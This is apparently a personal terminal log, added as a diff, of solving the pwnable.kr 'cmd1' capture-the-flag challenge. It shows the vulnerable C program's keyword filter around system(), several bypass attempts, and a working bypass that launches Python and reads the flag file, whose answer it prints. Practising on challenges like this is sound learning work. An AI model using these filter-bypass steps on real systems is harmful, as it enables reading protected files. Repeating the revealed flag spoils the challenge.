@@ -1,0 +1,54 @@
+dalal@ItamarLaptop:/mnt/c/Users/dalal/desktop/private_projects/ctf/pwnable.kr/cmd1$ ssh cmd1@pwnable.kr -p2222
+cmd1@pwnable.kr's password:
+Permission denied, please try again.
+cmd1@pwnable.kr's password:
+ ____  __    __  ____    ____  ____   _        ___      __  _  ____
+|    \|  |__|  ||    \  /    ||    \ | |      /  _]    |  |/ ]|    \
+|  o  )  |  |  ||  _  ||  o  ||  o  )| |     /  [_     |  ' / |  D  )
+|   _/|  |  |  ||  |  ||     ||     || |___ |    _]    |    \ |    /
+|  |  |  `  '  ||  |  ||  _  ||  O  ||     ||   [_  __ |     \|    \
+|  |   \      / |  |  ||  |  ||     ||     ||     ||  ||  .  ||  .  \
+|__|    \_/\_/  |__|__||__|__||_____||_____||_____||__||__|\_||__|\_|
+
+- Site admin : daehee87@khu.ac.kr
+- irc.netgarage.org:6667 / #pwnable.kr
+- Simply type "irssi" command to join IRC now
+- files under /tmp can be erased anytime. make your directory under /tmp
+- to use peda, issue `source /usr/share/peda/peda.py` in gdb terminal
+You have mail.
+Last login: Fri Jul 19 08:34:04 2024 from 147.235.201.104
+cmd1@pwnable:~$ ls
+cmd1  cmd1.c  flag
+cmd1@pwnable:~$ cat cmd1.c
+#include <stdio.h>
+#include <string.h>
+
+int filter(char* cmd){
+        int r=0;
+        r += strstr(cmd, "flag")!=0;
+        r += strstr(cmd, "sh")!=0;
+        r += strstr(cmd, "tmp")!=0;
+        return r;
+}
+int main(int argc, char* argv[], char** envp){
+        putenv("PATH=/thankyouverymuch");
+        if(filter(argv[1])) return 0;
+        system( argv[1] );
+        return 0;
+}
+
+cmd1@pwnable:~$ ./cmd1 "$(echo /bin/echo hello)"
+hello
+cmd1@pwnable:~$ ./cmd1 "$(echo /bin/cat flag)"
+cmd1@pwnable:~$ VAR="flag" // I tried to pass it without actully writing flag (so it will pass the filter), but it doesnt work (because VAR is replaced before the execution) 
+cmd1@pwnable:~$ ./cmd1 "$(echo /bin/cat $VAR)"
+
+cmd1@pwnable:~$ which python
+/usr/bin/python
+cmd1@pwnable:~$ ./cmd1 "$(echo /usr/bin/python)"
+Python 2.7.12 (default, Mar  1 2021, 11:38:31)
+[GCC 5.4.0 20160609] on linux2
+Type "help", "copyright", "credits" or "license" for more information.
+>>> f = open("flag" ,'r')
+>>> f.read()
+'mommy now I get what PATH environment is for :)\n'
